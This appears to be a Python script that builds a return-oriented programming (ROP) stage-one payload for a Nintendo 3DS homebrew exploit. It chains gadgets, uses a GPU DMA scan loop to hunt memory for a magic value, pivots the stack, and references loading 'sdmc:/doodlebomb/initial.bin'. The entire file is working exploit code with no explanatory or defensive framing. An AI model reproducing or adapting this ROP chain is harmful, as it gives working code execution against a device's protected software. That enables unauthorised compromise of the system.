from constants import *
import os
include("macros.py")
set_mem_offset(STAGE1_DEST)

deref_to_r0(APPMEMTYPE)
add_r0(0x100000000-0x6)
compare_r0_0()
store_if_equal(LINEAR_BUFFER + 0x07C00000 - CODEBIN_MAX_SIZE, loop_src)

begin_area(0x21C)
put_label("scan_loop")

add_word(GSPGPU_GXTRYENQUEUE_WRAPPER)
add_word(0x4)
put_label("loop_src")
add_word(LINEAR_BUFFER + 0x04000000 - CODEBIN_MAX_SIZE)
put_label("loop_dst")
add_word(LINEAR_BUFFER)
add_word(SCANLOOP_STRIDE)
add_word(0xFFFFFFFF)
add_word(0xFFFFFFFF)
add_word(0x8)
add_word(0x0)

add_word(0x0)

garbage(4)

sleep(100*1000)

store(GSPGPU_GXTRYENQUEUE_WRAPPER, scan_loop)

pop(r0=loop_dst)
add_word(LDR_R0R0_POP_R4PC)
add_word(0xDEADC0DE) # r4 garbage
add_word(LDR_R0R0_POP_R4PC)
add_word(0xDEADC0DE) # r4 garbage
add_r0(0x100000000 - MAGICVAL)
compare_r0_0()
store_if_equal(NOP, loop_pivot)

pop(r0=loop_src)
add_r0(SCANLOOP_STRIDE)
store_r0(loop_src)

pop(r0=loop_dst)
add_r0(0x20)
store_r0(loop_dst)

pop(r0=NOP_ptr_min_0x14)

put_label("loop_off")
print("scanloop: ", scan_loop)
print("loop_off: ", loop_off)
fill(scan_loop+0x21C-loop_off-4, 11223344, 4)

put_label("loop_pivot")
add_word(SUB_SPSP_21C_LDR_R1R0_LDR_R1R1_14_BLX_R1)

end_area()

deref_to_r0(loop_src)
add_r0(0x100000000 - SCANLOOP_STRIDE)
store_r0(final_dst)

#mount_sdmc(sdmc_string)
#try_open_file(context, file_path, FSFILE_READ)
#try_get_size(context, file_size)
#try_read_file(context, 0, 0, bytes_read, file_size, LINEAR_BUFFER)
#close_file(context)

put_label("final_dst")


put_label("NOP_ptr_min_0x14")
add_word(NOP_ptr_min_0x14)

put_label("sdmc_string")
add_ascii("sdmc:\0\0\0")

put_label("file_size")
add_word(0x0)
add_word(0x0)

put_label("NOP_ptr")
add_word(NOP)

put_label("bytes_read")
add_word(0x0)

put_label("context")
fill(0x20, 0)

put_label("file_path")
add_utf16("sdmc:/doodlebomb/initial.bin\0\0")
